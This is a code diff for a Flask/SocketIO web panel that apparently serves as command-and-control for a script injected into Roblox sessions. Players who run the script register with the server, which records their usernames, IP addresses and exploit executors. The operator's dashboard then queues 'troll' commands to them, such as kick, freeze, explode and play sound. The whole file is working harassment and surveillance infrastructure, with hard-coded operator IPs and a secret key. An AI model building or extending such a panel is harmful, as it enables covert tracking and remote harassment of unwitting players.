@@ -7,12 +7,11 @@ from datetime import datetime
 eventlet.monkey_patch()
 
 app = Flask(__name__)
-app.config["SECRET_KEY"] = "amber_cyber_key_777"
+app.config["SECRET_KEY"] = "amber_ultra_v3"
 socketio = SocketIO(app, cors_allowed_origins="*", async_mode="eventlet")
 
 # --- CONFIGURATION ---
 ALLOWED_IPS = {"37.66.149.36", "91.170.86.224"}
-
 connected_players = {}
 pending_commands = {}
 history_logs = [] 
@@ -38,29 +37,29 @@ def check_ip():
     if ip and "," in ip: ip = ip.split(",")[0].strip()
     if ip not in ALLOWED_IPS: abort(403)
 
-# --- INTERFACE HTML (Thème Orange/Yellow) ---
+# --- INTERFACE ---
 HTML = """
 <!DOCTYPE html>
 <html lang="fr">
 <head>
 <meta charset="UTF-8">
-<title>AMBER CONTROL PANEL</title>
+<title>AMBER CONTROL PANEL V3</title>
 <script src="https://cdn.socket.io/4.7.5/socket.io.min.js"></script>
 <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700&family=Rajdhani:wght@400;600&display=swap" rel="stylesheet">
 <style>
     :root {
-        --bg: #0a0800;
-        --card-bg: rgba(25, 20, 0, 0.9);
-        --accent: #ffcc00; /* Jaune Orange */
-        --accent-glow: rgba(255, 204, 0, 0.3);
-        --danger: #ff4400;
+        --bg: #050400;
+        --card-bg: rgba(20, 18, 0, 0.95);
+        --accent: #ffcc00;
+        --accent-glow: rgba(255, 204, 0, 0.4);
+        --danger: #ff3300;
     }
 
     * { box-sizing: border-box; margin: 0; padding: 0; }
     body { 
         font-family: 'Rajdhani', sans-serif; background: var(--bg); color: #fff; 
-        background-image: radial-gradient(circle at 50% 0%, #332200 0%, #0a0800 80%);
-        min-height: 100vh;
+        background-image: radial-gradient(circle at 50% 0%, #221a00 0%, #050400 80%);
+        min-height: 100vh; overflow-x: hidden;
     }
 
     .container { max-width: 1800px; margin: auto; padding: 15px; }
@@ -72,65 +71,58 @@ HTML = """
 
     .card { 
         background: var(--card-bg); border: 1px solid rgba(255, 204, 0, 0.1); 
-        border-radius: 12px; padding: 15px; position: relative; transition: 0.2s;
+        border-radius: 12px; padding: 15px; position: relative; transition: 0.3s;
         backdrop-filter: blur(10px);
     }
     .card:hover { border-color: var(--accent); box-shadow: 0 0 20px var(--accent-glow); }
 
-    .trash-player { position: absolute; top: 12px; right: 12px; background: none; border: none; color: #555; cursor: pointer; font-size: 1.1rem; }
-    .trash-player:hover { color: var(--danger); }
-
-    .status-badge { display: flex; align-items: center; font-size: 0.7rem; font-weight: bold; margin-bottom: 10px; color: var(--accent); opacity: 0.8; }
+    .status-badge { display: flex; align-items: center; font-size: 0.7rem; font-weight: bold; margin-bottom: 10px; color: var(--accent); }
     .dot { width: 7px; height: 7px; border-radius: 50%; margin-right: 6px; background: #333; }
     .dot.online { background: var(--accent); box-shadow: 0 0 10px var(--accent); }
 
     .name a { font-family: 'Orbitron'; font-size: 1.1rem; color: #fff; text-decoration: none; }
-    .name a:hover { color: var(--accent); }
-
     .info-box { font-size: 0.8rem; color: #bbb; margin: 10px 0; line-height: 1.5; background: rgba(0,0,0,0.3); padding: 8px; border-radius: 6px; }
     .info-box b { color: var(--accent); }
-    .info-box a { color: #fff; text-decoration: underline; }
 
-    .section-label { color: var(--accent); font-size: 0.65rem; letter-spacing: 1px; margin: 15px 0 8px; text-transform: uppercase; font-weight: bold; }
+    /* ANIMATIONS INPUTS */
+    input[type="text"] {
+        width: 100%; padding: 12px; background: #111; border: 1px solid #333; color: #fff; 
+        margin: 15px 0; border-radius: 8px; font-family: 'Rajdhani'; transition: all 0.3s ease;
+        outline: none;
+    }
+    input[type="text"]:focus {
+        border-color: var(--accent);
+        box-shadow: 0 0 15px var(--accent-glow);
+        background: #1a1a00;
+        transform: translateY(-2px);
+    }
 
     .btn-group { display: grid; grid-template-columns: repeat(2, 1fr); gap: 8px; }
-    .btn { 
-        padding: 10px; border: none; border-radius: 6px; cursor: pointer; 
-        font-weight: 700; font-family: 'Rajdhani'; font-size: 0.8rem; text-transform: uppercase; transition: 0.2s;
-    }
-    .btn-troll { background: rgba(255, 204, 0, 0.15); border: 1px solid var(--accent); color: var(--accent); }
-    .btn-troll:hover { background: var(--accent); color: #000; }
-    
-    .btn-kick { background: linear-gradient(45deg, #cc8800, #ffaa00); color: #000; }
-    .btn-undo { background: #1a1a1a; color: #777; border: 1px solid #333; }
-    .btn-undo:hover { border-color: #555; color: #fff; }
+    .btn { padding: 10px; border: none; border-radius: 6px; cursor: pointer; font-weight: 700; font-family: 'Rajdhani'; font-size: 0.8rem; text-transform: uppercase; transition: 0.2s; }
+    .btn-troll { background: rgba(255, 204, 0, 0.1); border: 1px solid var(--accent); color: var(--accent); }
+    .btn-troll:hover { background: var(--accent); color: #000; box-shadow: 0 0 10px var(--accent); }
+    .btn-kick { background: linear-gradient(45deg, #cc8800, #ffaa00); color: #000; font-weight: 800; }
 
-    /* HISTORIQUE */
     .history-panel { background: rgba(0,0,0,0.5); border: 1px solid #222; border-radius: 12px; padding: 15px; height: 85vh; display: flex; flex-direction: column; }
     .history-list { flex-grow: 1; overflow-y: auto; }
-    .history-item { padding: 12px; border-bottom: 1px solid #1a1a1a; font-size: 0.8rem; }
-    .hist-time { color: var(--accent); font-family: monospace; }
-    .hist-user { color: #fff; font-weight: bold; }
+    .history-item { padding: 12px; border-bottom: 1px solid #1a1a1a; font-size: 0.8rem; animation: fadeIn 0.3s ease; }
 
-    /* MODALS */
-    .modal { display: none; position: fixed; top:0; left:0; width:100%; height:100%; background:rgba(0,0,0,0.85); z-index:1000; align-items:center; justify-content:center; }
+    .modal { display: none; position: fixed; top:0; left:0; width:100%; height:100%; background:rgba(0,0,0,0.85); z-index:1000; align-items:center; justify-content:center; backdrop-filter: blur(4px); }
     .modal.active { display: flex; }
-    .modal-content { background: #111; padding: 30px; border: 2px solid var(--accent); border-radius: 15px; width: 350px; text-align: center; }
-    .modal-content input { width: 100%; padding: 12px; background: #000; border: 1px solid #333; color: #fff; margin: 15px 0; border-radius: 8px; font-family: 'Rajdhani'; }
+    .modal-content { background: #0a0a0a; padding: 30px; border: 2px solid var(--accent); border-radius: 15px; width: 350px; text-align: center; box-shadow: 0 0 30px rgba(255,204,0,0.2); }
+
+    @keyframes fadeIn { from { opacity: 0; transform: translateY(5px); } to { opacity: 1; transform: translateY(0); } }
 </style>
 </head>
 <body>
-
 <div class="container">
-    <header><h1>AMBER PANEL SYSTEM</h1></header>
-    
+    <header><h1>AMBER CONTROL PANEL</h1></header>
     <div class="main-layout">
         <section><div class="grid" id="players"></div></section>
-
         <aside>
             <div style="display:flex; justify-content:space-between; margin-bottom:10px; font-family:'Orbitron'; font-size:0.7rem;">
-                <span style="color:var(--accent)">DÉTAILS_HISTORIQUE</span>
-                <button onclick="clearHistory()" style="background:none; border:none; color:#444; cursor:pointer;">[ PURGE ]</button>
+                <span style="color:var(--accent)">LOGS_HISTORIQUE</span>
+                <button onclick="clearAllHistory()" style="background:none; border:none; color:var(--danger); cursor:pointer; font-weight:bold;">[ PURGE ]</button>
             </div>
             <div class="history-panel"><div class="history-list" id="history-list"></div></div>
         </aside>
@@ -138,19 +130,19 @@ HTML = """
 </div>
 
 <div class="modal" id="kickModal"><div class="modal-content">
-    <h2 style="color:var(--accent); font-family:'Orbitron'; font-size:1.2rem;">KICK_USER</h2>
-    <input type="text" id="kickReason" placeholder="Raison du kick...">
+    <h2 style="color:var(--accent); font-family:'Orbitron'; font-size:1.2rem;">KICK_PLAYER</h2>
+    <input type="text" id="kickReason" placeholder="Raison (ex: Test)...">
     <div style="display:flex; gap:10px">
-        <button class="btn btn-undo" style="flex:1" onclick="closeModal('kickModal')">ANNULER</button>
+        <button class="btn" style="flex:1; background:#222; color:#fff" onclick="closeModal('kickModal')">ANNULER</button>
         <button class="btn btn-kick" style="flex:1" id="confirmKickBtn">CONFIRMER</button>
     </div>
 </div></div>
 
 <div class="modal" id="soundModal"><div class="modal-content">
-    <h2 style="color:var(--accent); font-family:'Orbitron'; font-size:1.2rem;">AUDIO_ID</h2>
-    <input type="text" id="soundAssetId" placeholder="Asset ID (ex: 12345)">
+    <h2 style="color:var(--accent); font-family:'Orbitron'; font-size:1.2rem;">PLAY_AUDIO</h2>
+    <input type="text" id="soundAssetId" placeholder="ID de l'asset...">
     <div style="display:flex; gap:10px">
-        <button class="btn btn-undo" style="flex:1" onclick="closeModal('soundModal')">ANNULER</button>
+        <button class="btn" style="flex:1; background:#222; color:#fff" onclick="closeModal('soundModal')">ANNULER</button>
         <button class="btn btn-troll" style="flex:1; background:var(--accent); color:#000" id="confirmSoundBtn">JOUER</button>
     </div>
 </div></div>
@@ -164,22 +156,28 @@ function openSoundModal(uid) { selectedUid = uid; document.getElementById('sound
 function closeModal(id) { document.getElementById(id).classList.remove('active'); selectedUid = null; }
 
 function sendTroll(uid, cmd, val = null) {
-    // Si c'est un kick, 'val' est la raison. Si c'est sound, 'val' est l'assetId.
-    fetch("/troll", {method: "POST", headers: {"Content-Type": "application/json"}, 
-    body: JSON.stringify({userid: uid, cmd: cmd, value: val})});
+    fetch("/troll", {
+        method: "POST", 
+        headers: {"Content-Type": "application/json"}, 
+        body: JSON.stringify({userid: uid, cmd: cmd, value: val})
+    });
 }
 
 document.getElementById('confirmKickBtn').onclick = () => {
-    const reason = document.getElementById('kickReason').value;
-    sendTroll(selectedUid, 'kick', reason || "Kicked by Admin");
+    const reasonValue = document.getElementById('kickReason').value || "Kicked by Admin";
+    sendTroll(selectedUid, 'kick', reasonValue);
     closeModal('kickModal');
+    document.getElementById('kickReason').value = "";
 };
 
 document.getElementById('confirmSoundBtn').onclick = () => {
-    const sid = document.getElementById('soundAssetId').value;
-    sendTroll(selectedUid, 'playsound', sid);
+    const assetId = document.getElementById('soundAssetId').value;
+    sendTroll(selectedUid, 'playsound', assetId);
     closeModal('soundModal');
+    document.getElementById('soundAssetId').value = "";
 };
+
+function clearAllHistory() { fetch("/clear_history", {method: "POST"}); }
 
 socket.on("update", (data) => {
     const grid = document.getElementById("players");
@@ -191,16 +189,12 @@ socket.on("update", (data) => {
             card = document.createElement("div"); card.className = "card"; card.id = `card_${id}`; grid.appendChild(card);
         }
         card.innerHTML = `
-            <button class="trash-player" onclick="fetch('/delete_player',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({userid:'${id}'})})">✕</button>
-            <div class="status-badge"><div class="dot ${p.online ? 'online' : ''}"></div>${p.online ? 'CONNECTED' : 'IDLE'}</div>
+            <div class="status-badge"><div class="dot ${p.online ? 'online' : ''}"></div>${p.online ? 'SYNC_ACTIVE' : 'IDLE'}</div>
             <div class="name"><a href="https://www.roblox.com/fr/users/${id}/profile" target="_blank">${p.username}</a></div>
             <div class="info-box">
-                IP: <b>${p.ip}</b><br>
-                EX: <b>${p.executor}</b><br>
-                GAME: <a href="https://www.roblox.com/fr/games/${p.gameId}" target="_blank">${p.gameName}</a>
+                IP: <b>${p.ip}</b> | EX: <b>${p.executor}</b><br>
+                G: <a href="https://www.roblox.com/fr/games/${p.gameId}" target="_blank">${p.gameName}</a>
             </div>
-            
-            <div class="section-label">Attack Modules</div>
             <div class="btn-group">
                 <button class="btn btn-kick" onclick="openKickModal('${id}')">KICK</button>
                 <button class="btn btn-troll" onclick="sendTroll('${id}','freeze')">FREEZE</button>
@@ -209,15 +203,8 @@ socket.on("update", (data) => {
                 <button class="btn btn-troll" onclick="sendTroll('${id}','rainbow')">RAINBOW</button>
                 <button class="btn btn-troll" onclick="sendTroll('${id}','invisible')">INVISIBLE</button>
                 <button class="btn btn-troll" onclick="sendTroll('${id}','explode')">EXPLODE</button>
-                <button class="btn btn-troll" style="background:#ff8800; color:#000; border:none" onclick="openSoundModal('${id}')">SOUND</button>
-            </div>
-            
-            <div class="section-label">Restore Modules</div>
-            <div class="btn-group">
-                <button class="btn btn-undo" onclick="sendTroll('${id}','unfreeze')">UNFREEZE</button>
-                <button class="btn btn-undo" onclick="sendTroll('${id}','unspin')">UNSPIN</button>
-                <button class="btn btn-undo" onclick="sendTroll('${id}','unrainbow')">UNRAINBOW</button>
-                <button class="btn btn-undo" onclick="sendTroll('${id}','stopsound')">STOP AUDIO</button>
+                <button class="btn btn-troll" style="background:orange; color:#000; border:none" onclick="openSoundModal('${id}')">SOUND</button>
+                <button class="btn btn-troll" style="grid-column: span 2; background:#333; border:1px solid #444; color:#888" onclick="sendTroll('${id}','unfreeze')">UNFREEZE / STOP ALL</button>
             </div>
         `;
     });
@@ -228,11 +215,9 @@ socket.on("update_history", (logs) => {
     const list = document.getElementById("history-list");
     list.innerHTML = logs.map(log => `
         <div class="history-item">
-            <span class="hist-time">[${log.time}]</span> <span class="hist-user">${log.user}</span> <span style="font-size:0.7rem; color:#444">(${log.ip})</span>
-            <div style="color:var(--accent); margin-top:3px; font-weight:bold">${log.action}</div>
-            <div style="font-size:0.7rem; color:#666; margin-top:2px">
-                <a href="https://www.roblox.com/fr/games/${log.gameId}" target="_blank">${log.gameName}</a> | ${log.executor}
-            </div>
+            <span style="color:var(--accent); font-family:monospace">[${log.time}]</span> <b>${log.user}</b><br>
+            <span style="color:#fff">${log.action}</span><br>
+            <span style="font-size:0.7rem; color:#555">${log.ip} | ${log.executor}</span>
         </div>
     `).join('');
 });
@@ -243,20 +228,24 @@ socket.on("update_history", (logs) => {
 
 # --- ROUTES PYTHON ---
 
+@app.route("/")
+def index():
+    check_ip()
+    return render_template_string(HTML)
+
+@socketio.on('connect')
+def handle_connect():
+    emit("update_history", history_logs)
+
 @app.route("/troll", methods=["POST"])
 def troll():
     check_ip()
     d = request.get_json()
     uid, cmd, val = str(d["userid"]), d["cmd"], d.get("value")
-    
-    # On stocke la commande et la valeur (raison ou assetId)
+    # Stockage de la commande avec sa valeur spécifique
     pending_commands[uid] = {"command": cmd, "value": val}
-    
     p_data = connected_players.get(uid, {"username": "Unknown"})
-    log_msg = f"CMD: {cmd.upper()}"
-    if val: log_msg += f" ({val})"
-    
-    add_to_history(log_msg, p_data)
+    add_to_history(f"{cmd.upper()}: {val if val else 'N/A'}", p_data)
     return jsonify({"sent": True})
 
 @app.route("/api", methods=["GET", "POST"])
@@ -267,11 +256,11 @@ def api():
         uid = str(d.get("userid", ""))
         if d.get("action") == "register" and uid:
             d["userid"] = uid
-            if uid not in connected_players: add_to_history("SYSTÈME: CONNECTÉ", d)
+            if uid not in connected_players: add_to_history("SYSTEM: JOINED", d)
             connected_players[uid] = {
                 "username": d.get("username", "Unknown"),
                 "ip": d.get("ip", "Unknown"),
-                "gameName": d.get("gameName", "Click to view"),
+                "gameName": d.get("gameName", "Click to View"),
                 "gameId": d.get("gameId", "0"),
                 "executor": d.get("executor", "Unknown"),
                 "last": now, "online": True
@@ -286,30 +275,11 @@ def api():
             return jsonify(pending_commands.pop(uid))
         return jsonify({})
 
-# (Le reste des fonctions index, delete_player, clear_history et broadcast_loop reste identique)
-@app.route("/")
-def index():
-    check_ip()
-    return render_template_string(HTML)
-
-@socketio.on('connect')
-def handle_connect():
-    emit("update_history", history_logs)
-
-@app.route("/delete_player", methods=["POST"])
-def delete_player():
-    check_ip()
-    uid = str(request.get_json()["userid"])
-    if uid in connected_players:
-        add_to_history("SYSTÈME: SUPPRIMÉ", connected_players[uid])
-        del connected_players[uid]
-    return jsonify({"ok": True})
-
 @app.route("/clear_history", methods=["POST"])
 def clear_history():
     check_ip()
     global history_logs
-    history_logs.clear()
+    history_logs = [] # On vide la liste
     socketio.emit("update_history", history_logs)
     return jsonify({"ok": True})
 
@@ -321,7 +291,7 @@ def broadcast_loop():
             p["online"] = (now - p["last"] < 15)
             if now - p["last"] > 60: to_remove.append(uid)
         for uid in to_remove:
-            add_to_history("SYSTÈME: DÉCONNECTÉ", connected_players[uid])
+            add_to_history("SYSTEM: TIMEOUT", connected_players[uid])
             del connected_players[uid]
         socketio.emit("update", {"players": connected_players})
         socketio.sleep(2)
